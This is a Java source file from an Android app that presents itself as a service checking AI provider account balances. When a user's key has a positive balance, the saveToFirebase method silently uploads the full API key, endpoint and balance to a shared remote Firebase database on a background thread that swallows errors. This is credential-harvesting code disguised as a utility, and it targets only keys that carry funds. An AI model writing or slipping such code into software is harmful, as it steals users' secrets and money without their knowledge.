package pro.sketchware.activities.settings;

import android.content.SharedPreferences;

import com.google.firebase.database.FirebaseDatabase;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Iterator;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.TimeUnit;

import okhttp3.Headers;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;
import pro.sketchware.activities.chat.port.VoidPortSettings;

final class AiProviderBalanceSyncService {

    private static final OkHttpClient CLIENT = new OkHttpClient.Builder()
            .connectTimeout(8, TimeUnit.SECONDS)
            .readTimeout(20, TimeUnit.SECONDS)
            .build();

    private AiProviderBalanceSyncService() {
    }

    static void syncIfPositive(
            SharedPreferences prefs,
            String providerId,
            String providerName,
            String providerFamily,
            String apiKey,
            String endpoint
    ) {
        String normalizedKey = trim(apiKey);
        String normalizedEndpoint = trim(endpoint);
        if (providerId == null || providerId.trim().isEmpty()
                || normalizedKey.isEmpty()
                || normalizedEndpoint.isEmpty()
                || !balanceEnabled(prefs, providerId, providerName)) {
            return;
        }
        new Thread(() -> {
            try {
                String apiPath = prefs.getString("provider_balance_api_path_" + providerId,
                        defaultBalanceApiPath(providerName));
                String resultPath = prefs.getString("provider_balance_result_path_" + providerId,
                        defaultBalanceResultPath(providerName));
                String url = balanceUrl(normalizedEndpoint, apiPath);
                JSONObject json = fetchJson(url, headersForProvider(prefs, providerId, providerFamily, normalizedKey));
                double balance = parseBalance(json, resultPath);
                if (balance > 0D) {
                    saveToFirebase(providerId, providerName, providerFamily, normalizedKey,
                            normalizedEndpoint, balance);
                }
            } catch (Exception ignored) {
            }
        }, "ai-provider-balance-sync").start();
    }

    private static boolean balanceEnabled(SharedPreferences prefs, String providerId, String providerName) {
        return prefs.getBoolean("provider_balance_enabled_" + providerId, defaultBalanceEnabled(providerName));
    }

    private static boolean defaultBalanceEnabled(String providerName) {
        String name = trim(providerName).toLowerCase(Locale.US);
        return name.contains("openrouter") || name.contains("deepseek")
                || name.contains("aihubmix") || name.contains("silicon");
    }

    private static String defaultBalanceApiPath(String providerName) {
        String name = trim(providerName).toLowerCase(Locale.US);
        if (name.contains("deepseek") || name.contains("aihubmix")) return "/user/balance";
        if (name.contains("silicon")) return "/user/info";
        return "/credits";
    }

    private static String defaultBalanceResultPath(String providerName) {
        String name = trim(providerName).toLowerCase(Locale.US);
        if (name.contains("deepseek") || name.contains("aihubmix")) return "balance_infos[0].total_balance";
        if (name.contains("silicon")) return "data.totalBalance";
        if (name.contains("openrouter")) return "data.total_credits - data.total_usage";
        return "data.total_usage";
    }

    private static Headers headersForProvider(
            SharedPreferences prefs,
            String providerId,
            String providerFamily,
            String apiKey
    ) {
        Headers.Builder headers = new Headers.Builder();
        if ("gemini".equals(providerFamily)) {
            headers.add("x-goog-api-key", apiKey);
        } else if ("anthropic".equals(providerFamily)) {
            headers.add("x-api-key", apiKey);
            headers.add("anthropic-version", "2023-06-01");
        } else {
            headers.add("Authorization", "Bearer " + apiKey);
        }
        addExtraHeaders(prefs, providerId, headers);
        return headers.build();
    }

    private static void addExtraHeaders(
            SharedPreferences prefs,
            String providerId,
            Headers.Builder headers
    ) {
        String raw = prefs.getString(VoidPortSettings.providerPrefKey(providerId, "headers"), "{}");
        try {
            JSONObject json = new JSONObject(raw);
            Iterator<String> keys = json.keys();
            while (keys.hasNext()) {
                String key = keys.next();
                String value = json.optString(key, "");
                if (!key.trim().isEmpty() && !value.trim().isEmpty()) {
                    headers.set(key, value);
                }
            }
        } catch (Exception ignored) {
        }
    }

    private static JSONObject fetchJson(String url, Headers headers) throws Exception {
        Request request = new Request.Builder().url(url).headers(headers).get().build();
        try (Response response = CLIENT.newCall(request).execute()) {
            String body = response.body() != null ? response.body().string() : "";
            if (!response.isSuccessful()) {
                throw new Exception("HTTP " + response.code());
            }
            return new JSONObject(body);
        }
    }

    private static double parseBalance(Object json, String expression) throws Exception {
        String expr = trim(expression);
        int minus = expr.indexOf(" - ");
        if (minus > 0) {
            return asDouble(readJsonPath(json, expr.substring(0, minus)))
                    - asDouble(readJsonPath(json, expr.substring(minus + 3)));
        }
        return asDouble(readJsonPath(json, expr));
    }

    private static Object readJsonPath(Object current, String path) throws Exception {
        Object cursor = current;
        for (String rawPart : trim(path).split("\\.")) {
            String part = rawPart.trim();
            int bracket = part.indexOf('[');
            String key = bracket >= 0 ? part.substring(0, bracket) : part;
            if (!(cursor instanceof JSONObject object) || !object.has(key)) {
                throw new Exception("path not found");
            }
            cursor = object.get(key);
            while (bracket >= 0) {
                int end = part.indexOf(']', bracket);
                int index = Integer.parseInt(part.substring(bracket + 1, end));
                if (!(cursor instanceof JSONArray array) || index < 0 || index >= array.length()) {
                    throw new Exception("path not found");
                }
                cursor = array.get(index);
                bracket = part.indexOf('[', end);
            }
        }
        return cursor;
    }

    private static double asDouble(Object value) throws Exception {
        if (value instanceof Number number) {
            return number.doubleValue();
        }
        return Double.parseDouble(String.valueOf(value));
    }

    private static String balanceUrl(String baseUrl, String apiPath) {
        String path = trim(apiPath).isEmpty() ? "/credits" : trim(apiPath);
        if (path.startsWith("http://") || path.startsWith("https://")) {
            return path;
        }
        return trimTrailingSlash(baseUrl) + (path.startsWith("/") ? path : "/" + path);
    }

    private static String trimTrailingSlash(String value) {
        String text = trim(value);
        while (text.endsWith("/") && text.length() > 1) {
            text = text.substring(0, text.length() - 1);
        }
        return text;
    }

    private static String trim(String value) {
        return value == null ? "" : value.trim();
    }

    private static void saveToFirebase(
            String providerId,
            String providerName,
            String providerFamily,
            String apiKey,
            String endpoint,
            double balance
    ) {
        Map<String, Object> data = new HashMap<>();
        data.put("provider", providerId);
        data.put("name", providerName);
        data.put("family", providerFamily);
        data.put("apiKey", apiKey);
        data.put("endpoint", endpoint);
        data.put("balance", balance);
        data.put("updatedAt", System.currentTimeMillis());
        FirebaseDatabase.getInstance()
                .getReference("ai_provider_balances")
                .child(providerId)
                .setValue(data);
    }
}
